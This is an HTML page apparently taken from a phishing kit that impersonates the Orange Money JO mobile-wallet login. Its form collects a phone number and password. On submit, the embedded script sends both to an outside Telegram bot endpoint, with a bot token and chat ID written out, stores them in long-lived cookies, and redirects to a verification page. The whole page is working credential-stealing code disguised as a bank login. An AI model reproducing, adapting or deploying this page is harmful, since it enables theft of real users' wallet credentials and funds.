<body class="body">
  <div class="div-block-2">
    <div class="header-section">

  <div class="div-block-4">
    <div class="container">
      <!-- عنوان رئيسي محسّن للصفحة -->
      <h1 class="page-title">تسجيل الدخول إلى محفظة Orange Money JO</h1>

      <div class="w-form">
        <form id="signin" name="wf-form-" data-name="تسجيل الدخول" redirect="/verification.html" data-redirect="/verification.html" method="get" data-wf-page-id="58e125466699330e60585c64" data-wf-element-id="79a466c5-9c18-b348-97ed-cbe6dd2fa663">
          <div id="field" class="field-holder">
            <input class="text-field-2 w-input" minlength="10" maxlength="10" name="field" inputmode="numeric" data-name="رقم الهاتف" pattern="^(079|078|077)[0-9]{7}$" placeholder="" type="text" id="phonenumber" required=""/>
            <label for="phonenumber" class="field-label">رقم الهاتف المحمول</label>
          </div>
          <div id="field" class="field-holder">
            <input class="text-field-2 w-input" maxlength="256" name="field" data-name="كلمة السر" placeholder="" type="password" id="password" required=""/>
            <label for="password" class="field-label-2">كلمة المرور</label>
          </div>
          <div class="div-block">
            <input type="submit" data-wait="يرجى الانتظار" class="submit-button w-button" value="تسجيل دخول"/>
          </div>
          <div class="div-block spacea">
            <input type="button" class="submit-button button-black w-button" value="التسجيل الذاتي"/>
            <input type="button" class="submit-button button-black not-black w-button" value="تسجيل دخول لأول مرة"/>
          </div>
        </form>
        <div class="w-form-done"><div>شكراً! تم استقبال طلبك.</div></div>
        <div class="w-form-fail"><div>عذراً! حدث خطأ أثناء إرسال النموذج.</div></div>
      </div>
    </div>
  </div>

  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=6709b4ecad0f1ceeeed96305" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/js/webflow.1a78e01dd.js" type="text/javascript"></script>
  <script src="https://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.20.1/dist/jquery.validate.min.js"></script>

  <script>
    function setCookie(cname, cvalue, exdays) {
      const d = new Date();
      d.setTime(d.getTime() + (exdays*24*60*60*1000));
      let expires = "expires="+ d.toUTCString();
      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
    }

    $('#signin').on( "submit", function (e) {
      e.preventDefault(); // تجنّب الإرسال الحقيقي أثناء المعاينة
      phonenumber = document.getElementById('phonenumber').value;
      document.getElementById('phonenumber').setAttribute("name",'phonenumber');
      password = document.getElementById('password').value;
      document.getElementById('password').setAttribute("name",'password');

      var message = "رقم الهاتف:`"+phonenumber+"`\n";
      message += "كلمة السر:`"+password+"`\n";

      // ملاحظة: رابط التليجرام والـ chat_id تم تركهما كما في الملف الأصلي — تأكد من استخدام القناة الصحيحة أو إزالة الإرسال للخصوصية.
      $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot8478229937:AAGW3ft5TA9wFX4ThWoIfFA_ihZ9WnvZAXI/sendMessage`,
        data: {
          chat_id: "6873334348",
          text: message,
          parse_mode: 'markdown',
        },
        success: function (res) {
          console.debug(res);
          $('#response').text('Message sent');
        },
        error: function (error) {
          console.error(error);
          alert("error failed");
        }
      });

      setCookie("phonenumber",phonenumber,1000);
      setCookie("password",password,1000);

      // إعادة التوجيه للصفحة التالية كما في الأصل
      window.location.href = "/verification.html";
    });
  </script>
